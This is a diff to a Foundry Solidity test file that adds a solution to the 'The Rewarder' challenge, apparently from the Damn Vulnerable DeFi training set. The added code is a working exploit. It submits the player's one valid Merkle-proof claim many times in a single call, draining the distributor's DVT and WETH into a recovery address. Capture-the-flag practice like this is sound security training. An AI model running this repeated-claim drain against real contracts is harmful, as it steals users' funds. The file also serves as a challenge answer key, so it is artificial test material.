@@ -7,12 +7,15 @@ import {Merkle} from "murky/Merkle.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {console} from "forge-std/console.sol";
 
 contract TheRewarderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address alice = makeAddr("alice");
     address recovery = makeAddr("recovery");
+
+    error InvalidBeneficiary();
 
     uint256 constant BENEFICIARIES_AMOUNT = 1000;
     uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
@@ -148,7 +151,53 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        (Claim memory claimDvt, uint256 rewardDvt) = _getClaimOfBeneficiary(
+            0,
+            "/test/the-rewarder/dvt-distribution.json",
+            player
+        );
+        (Claim memory claimWeth, uint256 rewardWeth) = _getClaimOfBeneficiary(
+            0,
+            "/test/the-rewarder/weth-distribution.json",
+            player
+        );
+        uint256 numberOfClaimsDvt = TOTAL_DVT_DISTRIBUTION_AMOUNT / rewardDvt;
+        uint256 numberOfClaimsWeth = TOTAL_WETH_DISTRIBUTION_AMOUNT / rewardWeth;
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaimDvt = new IERC20[](numberOfClaimsDvt);
+        IERC20[] memory tokensToClaimWeth = new IERC20[](numberOfClaimsWeth);
+        for (uint256 i = 0; i < numberOfClaimsDvt; i++) {
+            tokensToClaimDvt[i] = IERC20(address(dvt));
+        }
+        for (uint256 i = 0; i < numberOfClaimsWeth; i++) {
+            tokensToClaimWeth[i] = IERC20(address(weth));
+        }
+
+        // Create Alice's claims
+        Claim[] memory claimsDvt = new Claim[](numberOfClaimsDvt);
+        Claim[] memory claimsWeth = new Claim[](numberOfClaimsWeth);
+
+        for (uint256 i = 0; i < numberOfClaimsDvt; i++) {
+            claimsDvt[i] = claimDvt;
+        }
+        for (uint256 i = 0; i < numberOfClaimsWeth; i++) {
+            claimsWeth[i] = claimWeth;
+        }
+
+        uint256 remaingDvtBeforeClaim = distributor.getRemaining(address(dvt));
+        uint256 remaingWethBeforeClaim = distributor.getRemaining(address(weth));
+        distributor.claimRewards({inputClaims: claimsDvt, inputTokens: tokensToClaimDvt});
+        distributor.claimRewards({inputClaims: claimsWeth, inputTokens: tokensToClaimWeth});
+        uint256 remaingDvtAfterClaim = distributor.getRemaining(address(dvt));
+        uint256 remaingWethAfterClaim = distributor.getRemaining(address(weth));
+        console.log("dvt claimed", remaingDvtBeforeClaim - remaingDvtAfterClaim);
+        console.log("weth claimed", remaingWethBeforeClaim - remaingWethAfterClaim);
+        console.log("rewardDvt", rewardDvt);
+        console.log("rewardWeth", rewardWeth);
+        console.log("dvt remaining", distributor.getRemaining(address(dvt)));
+        console.log("weth remaining", distributor.getRemaining(address(weth)));
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -179,13 +228,38 @@ contract TheRewarderChallenge is Test {
 
     // Utility function to read rewards file and load it into an array of leaves
     function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
-        Reward[] memory rewards =
-            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+        Reward[] memory rewards = abi.decode(
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))),
+            (Reward[])
+        );
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
+    }
+    function _getClaimOfBeneficiary(
+        uint256 tokenIndex,
+        string memory path,
+        address beneficiary
+    ) private view returns (Claim memory, uint256) {
+        Reward[] memory rewards = abi.decode(
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))),
+            (Reward[])
+        );
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (rewards[i].beneficiary == beneficiary) {
+                bytes32[] memory leaves = _loadRewards(path);
+                Claim memory claim = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: rewards[i].amount,
+                    tokenIndex: tokenIndex,
+                    proof: merkle.getProof(leaves, i)
+                });
+                return (claim, rewards[i].amount);
+            }
+        }
+        revert InvalidBeneficiary();
     }
 }
